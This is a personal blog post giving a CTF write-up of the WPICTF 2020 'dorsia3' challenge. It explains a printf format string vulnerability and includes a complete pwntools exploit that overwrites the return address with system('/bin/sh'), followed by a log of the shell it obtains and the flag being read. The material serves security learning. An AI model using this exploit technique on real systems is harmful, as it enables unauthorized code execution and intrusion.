<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>&#x200F;Nils's website - Dorsia3 without gadgets (WPICTF 2020)</title><link rel="stylesheet" type="text/css" href="/assets/css/highlighting.css"><link rel="stylesheet" type="text/css" href="/assets/css/post.css"><link rel="alternate" type="application/atom+xml" title="Nils's blog RSS" href="feed.xml"></head><body><header><h1><a href="/">Nils's website</a></h1></header><main><h2>Dorsia3 without gadgets (WPICTF 2020)</h2><h3 id="why-this-writeup">Why this writeup?</h3><p>After the end of WPICTF, I looked at writeups so see how people solved different challenges, and realised that for dorsia1 and dorsia3, people had used a completely different approach, using magic gadgets, than the one I took, so I thought I would share what I did.</p><h3 id="dorsia3-250pts-55-solves">dorsia3 250pts (55 solves)</h3><h4 id="challenge-description">Challenge Description:</h4><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://us-east-1.linodeobjects.com/wpictf-challenge-files/dorsia.webm The third card.

nc dorsia3.wpictf.xyz 31337 or 31338 or 31339

made by: awg
</code></pre></div></div><h4 id="attachments">Attachments</h4><ul><li><a href="https://ctf.wpictf.xyz/files/4d325258ec2ab3df5383833fb30fe8aa/nanoprint?token=eyJ1c2VyX2lkIjo2NzQsInRlYW1faWQiOjM4OCwiZmlsZV9pZCI6MTR9.Xp3VIg.mDHcGNvi4W0KGbA3cKtCHwYKc0E"><code class="language-plaintext highlighter-rouge">nanoprint</code></a></li><li><a href="https://ctf.wpictf.xyz/files/fe7a59ebaa5fc5e00deae6553bce0677/libc.so.6?token=eyJ1c2VyX2lkIjo2NzQsInRlYW1faWQiOjM4OCwiZmlsZV9pZCI6MTV9.Xp3VIg.Z7c2-xFMKP-lfla8wamuBuImt0Y"><code class="language-plaintext highlighter-rouge">libc.so.6</code></a></li></ul><p>The third card on the video shows the following code:</p><div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="n">a</span><span class="p">[</span><span class="mi">69</span><span class="p">];</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"%p%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">system</span> <span class="o">-</span> <span class="mi">288</span><span class="p">);</span>
	<span class="n">fgets</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="mi">69</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div><p>Because, the program is printing untrusted user input with <code class="language-plaintext highlighter-rouge">printf</code>, a format string vulnerability can be exploited. We are also given the address of the buffer and the <code class="language-plaintext highlighter-rouge">system</code> function.</p><p>With some local testing, with GDB, I realised that the return address was 113 bytes after the address of the buffer <code class="language-plaintext highlighter-rouge">a</code>. <code class="language-plaintext highlighter-rouge">%n</code> will set the number of bytes written to the address pointed to by the pointed given as argument. So what we do, is we set the address of system, where the return pointer is and then set a pointer to <code class="language-plaintext highlighter-rouge">/bin/sh</code>, where system expects to find its first argument, in my case that was 121 bytes after the location of <code class="language-plaintext highlighter-rouge">a</code>.</p><h4 id="the-final-exploit">The final exploit:</h4><div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">if</span> <span class="bp">False</span><span class="p">:</span> <span class="c1"># if True, run the exploit locally, otherwise, run it remotely
</span>    <span class="n">r</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">./nanoprint</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">/usr/lib32/libc.so.6</span><span class="sh">"</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">r</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">dorsia3.wpictf.xyz</span><span class="sh">'</span><span class="p">,</span> <span class="mi">31337</span><span class="p">)</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./libc.so.6</span><span class="sh">"</span><span class="p">)</span>

<span class="n">line</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="nf">recvline</span><span class="p">().</span><span class="nf">decode</span><span class="p">()</span>
<span class="c1"># Read the address of `a` and `system`
</span><span class="n">a</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">line</span><span class="p">[:</span><span class="mi">10</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">system</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">line</span><span class="p">[</span><span class="mi">10</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="mi">288</span>

<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">system</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">]</span>

<span class="n">bin_sh</span> <span class="o">=</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">))</span>

<span class="n">lsb_sys</span> <span class="o">=</span> <span class="n">system</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
<span class="n">msb_sys</span> <span class="o">=</span> <span class="n">system</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span>
<span class="n">lsb_sh</span> <span class="o">=</span> <span class="n">bin_sh</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
<span class="n">msb_sh</span> <span class="o">=</span> <span class="n">bin_sh</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span>
<span class="n">values</span> <span class="o">=</span> <span class="p">[</span>
        <span class="p">(</span><span class="n">lsb_sys</span><span class="p">,</span> <span class="mi">7</span><span class="p">),</span>
        <span class="p">(</span><span class="n">msb_sys</span><span class="p">,</span> <span class="mi">8</span><span class="p">),</span>
        <span class="p">(</span><span class="n">lsb_sh</span><span class="p">,</span> <span class="mi">9</span><span class="p">),</span>
        <span class="p">(</span><span class="n">msb_sh</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
        <span class="p">]</span>

<span class="n">values</span> <span class="o">=</span> <span class="nf">sorted</span><span class="p">(</span><span class="n">values</span><span class="p">)</span>

<span class="c1"># A 1 byte padding is needed so that printf uses the correct arguments
</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">a</span> <span class="o">+</span> <span class="mi">113</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">a</span> <span class="o">+</span> <span class="mi">115</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">a</span> <span class="o">+</span> <span class="mi">121</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">a</span> <span class="o">+</span> <span class="mi">123</span><span class="p">)</span>

<span class="n">written</span> <span class="o">=</span> <span class="mi">17</span> <span class="c1"># 4 * 4 + 1; 4 bytes for each address and 1 byte for the "A"
</span><span class="k">for</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">values</span><span class="p">:</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">%</span><span class="si">{</span><span class="n">value</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="n">written</span><span class="si">}</span><span class="s">x</span><span class="sh">"</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
    <span class="n">written</span> <span class="o">=</span> <span class="n">value</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">%</span><span class="si">{</span><span class="n">value</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s">$n</span><span class="sh">"</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span> <span class="c1"># The output of `printf`
</span><span class="n">r</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</code></pre></div></div><p>I trick I used, which I doubt the usefulness of is sorting the addresses I need to write to by the value they should have. This in theory means that less data has to be sent back when <code class="language-plaintext highlighter-rouge">printf</code> is executed on the server side. However it is not necessary.</p><p>Initially, I tried to use a <code class="language-plaintext highlighter-rouge">/bin/sh</code> that was inside of <code class="language-plaintext highlighter-rouge">a</code> however, that failed so I fell back to using one inside of libc.</p><p>After running the exploit, we get a shell on the target, running <code class="language-plaintext highlighter-rouge">ls</code> reveals that the flag is in the current directory and we can now just <code class="language-plaintext highlighter-rouge">cat</code> it:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./exploit.py
[+] Opening connection to dorsia3.wpictf.xyz on port 31337: Done
[*] 'wpictf_2020/dorsia3/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Switching to interactive mode
$ ls
flag.txt
nanoprint
run_problem.sh
stdbuf
$ cat flag.txt
WPI{Th3re_is_an_idea_of_4_Pa7rick_BatemaN}
</code></pre></div></div><p>This however, isn’t the easiest way to solve the challenge as it is takes more time. If you haven’t already, I’d recommend reading <a href="https://ctftime.org/task/11316">other write-ups</a> as well to explore the different methods that can be used.</p><time datetime="2020-04-20">20 April 2020</time></main><footer> &copy; 2021, 2024 <a href="https://www.nilsand.re/">Nils André</a></footer></body></html>